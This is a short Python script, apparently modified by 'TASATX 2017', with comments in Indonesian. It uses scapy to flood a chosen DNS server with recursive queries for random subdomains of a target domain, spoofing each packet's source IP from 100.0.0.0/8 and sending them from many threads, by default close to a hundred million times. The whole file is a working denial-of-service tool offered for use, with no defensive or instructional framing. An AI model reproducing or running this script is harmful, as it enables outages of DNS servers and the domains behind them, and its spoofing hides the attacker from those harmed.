#!/usr/bin/python
# hanya jalan di KaliLinux atau Linux, sebab ada scapy dan lain-lain...
# modified by TASATX 2017
import random
import string
from optparse import OptionParser
from threading import Thread
import logging
import os
import time
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 

class TestData:
   def __init__(self, dstip):
	self.dstip = dstip

def DNS_recurse(test):
  chars = "".join( [random.choice(string.letters) for i in xrange(random.randint(10,30))] )
  target = "%s.%s" % (chars, test.suffix)
  print("Asking "+target+" to DNS "+test.dstip)
  send(IP(src=RandIP("100.0.0.0/8"), ttl=random.randint(10,64),  dst="%s" % test.dstip)/UDP(sport=RandShort(),dport=53)/DNS(rd=1L,id=RandShort(),qd=DNSQR(qname="%s" % target, qtype="A")),verbose=0,iface="%s" % test.iface)

# Parse options
usage = "Use -h to see all options.\nSample : dns-recurse.py -c 100 -d 192.168.0.1 -S abc.com"
parser = OptionParser(usage=usage)
parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
parser.add_option("-d", "--dest", dest="server", help="Destination server IP. Required field.")
parser.add_option("-i", "--iface", dest="iface", default="eth0", help="Source interface. Default eth0")
parser.add_option("-S", "--suffix", dest="suffix", help="DNS suffix")

(options, args) = parser.parse_args()

if (options.server is None) or (options.suffix is None): 
	print("Must have minimum -d and -S to run properly!")
	parser.print_help()
	exit(-1)

# Initialize default values and parse options 
i = 0
ret =  os.system("ip link set " + conf.iface + " promisc on")

# Move options data into a new object for the test run
test = TestData(options.server)

# Belajar bahwa ternyata object class test bisa diberi attribute property tanpa harus via __init__ :P
test.counter = options.counter 
test.iface = options.iface
test.suffix = options.suffix

while i < test.counter:
 try:
   t = Thread(target=DNS_recurse, args=(test,))
   t.start()
#   t.join()
# mencoba tidak perlu di-join supaya lebih cepat?
   i +=1
 except (KeyboardInterrupt):
   print("Exiting traffic generation...")
   raise SystemExit

